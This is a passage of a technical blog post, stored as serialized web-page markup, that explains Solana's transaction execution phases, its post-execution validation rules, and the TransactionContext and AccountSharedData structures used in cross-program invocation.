sm:text-justify\",\"children\":[[\"$\",\"mjx-container\",\"mjx-container-0\",{\"className\":\"MathJax\",\"jax\":\"SVG\",\"children\":[\"$\",\"svg\",\"svg-0\",{\"style\":{\"verticalAlign\":\"0\"},\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"0.988ex\",\"height\":\"1.887ex\",\"role\":\"img\",\"focusable\":\"false\",\"viewBox\":\"0 -833.9 436.6 833.9\",\"xmlnsXlink\":\"http://www.w3.org/1999/xlink\",\"children\":[[\"$\",\"defs\",\"defs-0\",{\"children\":[\"$\",\"path\",\"path-0\",{\"id\":\"MJX-2-TEX-N-31\",\"d\":\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"}]}],[\"$\",\"g\",\"g-0\",{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"transform\":\"scale(1,-1)\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"math\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"msup\",\"children\":[[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"mi\"}],[\"$\",\"g\",\"g-1\",{\"data-mml-node\":\"mn\",\"transform\":\"translate(33,363) scale(0.707)\",\"children\":[\"$\",\"use\",\"use-0\",{\"data-c\":\"31\",\"xlinkHref\":\"#MJX-2-TEX-N-31\"}]}]]}]}]}]]}]}],\" Programs can interact directly with the serialized bytes. Parsing serialized accounts into \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo\"}],\" is just what the solana program sdk does to make life easier for developers.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-4\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Phase 2: Program Execution\"}],\"\\n\",[\"$\",\"p\",\"p-27\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Once the accounts are serialized and loaded into the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region, the rBPF VM executes the program bytecode. The program has absolute control over its virtual memory space. It can overwrite account balances, change ownership, modify data, even corrupt the entire memory space. This design choice allows for maximum performance during execution, with security enforcement deferred to the validation phase.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-5\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Phase 3: Post-Execution Validation\"}],\"\\n\",[\"$\",\"p\",\"p-28\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"After the program finishes execution, the validator validates every change made during execution. It doesn't trust anything that happened during execution. Instead, it carefully checks every modification to ensure no rules were broken and no money was stolen.\"}],\"\\n\",[\"$\",\"p\",\"p-29\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Validation rules ensure state consistency and permission enforcement before persisting account state updates to storage:\"}],\"\\n\",[\"$\",\"ul\",\"ul-0\",{\"className\":\"text-xl py-2 text-pretty sm:text-justify\",\"style\":{\"display\":\"block\",\"listStyleType\":\"disc\",\"paddingInlineStart\":\"40px\"},\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[\"Account fields modifiable only if the account is marked writable in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Transaction\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instruction\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[\"Only the account owner modifies \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"owner\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"data\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Owner\"}],\" modifiable only when data is zeroed.\"]}],\"\\n\",[\"$\",\"li\",\"li-3\",{\"children\":\"Lamports can be increased by anyone but decreased only by the owner.\"}],\"\\n\",[\"$\",\"li\",\"li-4\",{\"children\":\"Total lamports remains consistent across transaction execution.\"}],\"\\n\"]}],\"\\n\",[\"$\",\"h3\",\"h3-6\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Phase 4: Final Commit\"}],\"\\n\",[\"$\",\"p\",\"p-30\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"After all validation rules pass, the modified account states are committed back to the database. All changes made during program execution are now persisted and the transaction is confirmed. If any validation rule fails, the entire transaction is rejected and no changes are stored.\"}],\"\\n\",[\"$\",\"p\",\"p-31\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Sounds simple, right?\"}],\"\\n\",[\"$\",\"h2\",\"h2-4\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"When Programs Need to Talk: Cross-Program Invocation (v1.14.x)\"}],\"\\n\",[\"$\",\"p\",\"p-32\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"But what happens when programs need to invoke each other, for instance, when your dex program needs to call the token program to transfer tokens? This is where Cross-Program Invocation (CPI) comes in, and where the elegant simplicity of single program execution starts to break down.\"}],\"\\n\",[\"$\",\"p\",\"p-33\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"The challenge is that each program runs in its own isolated VM with its own memory space. When Program A calls Program B, they can't simply share pointers or objects. Account data must be carefully marshaled between these isolated environments while maintaining security and consistency.\"}],\"\\n\",[\"$\",\"h3\",\"h3-7\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"TransactionContext: Shared Account Cache\"}],\"\\n\",[\"$\",\"p\",\"p-34\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"This brings us to a detail we omitted up till now. Since \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Transaction\"}],\" are atomic and may include multiple \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instruction\"}],\", it must have a way to cache temporal execution results of earlier \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instructions\"}],\" before latter \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instructions\"}],\" finish. This cache is crucial since we can't allow executions effects of earlier \",[\"$\",\"code\",\"code-4\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instructions\"}],\" to persist if unfortunately latter \",[\"$\",\"code\",\"code-5\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Instructions\"}],\" revert.\"]}],\"\\n\",[\"$\",\"p\",\"p-35\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"To this end, Solana introduces the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" structure state caching. The \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\" contains \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" structures, which are used to hold changes to accounts before the runtime either commits the changes to permanent storage, or reverts them later.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-4\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"TransactionContext\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    account_keys\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pin\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"              \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// All account addresses in transaction\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Arc\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"TransactionAccounts\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Shared account data cache\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    instruction_stack\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InstructionContext\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// CPI call stack\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],\"\\n\",[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"TransactionAccounts\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountSharedData\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Mutable account data\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],\"\\n\",[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Shared account data that persists across CPI boundaries \"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountSharedData\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    lamports\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    data\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Arc\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token 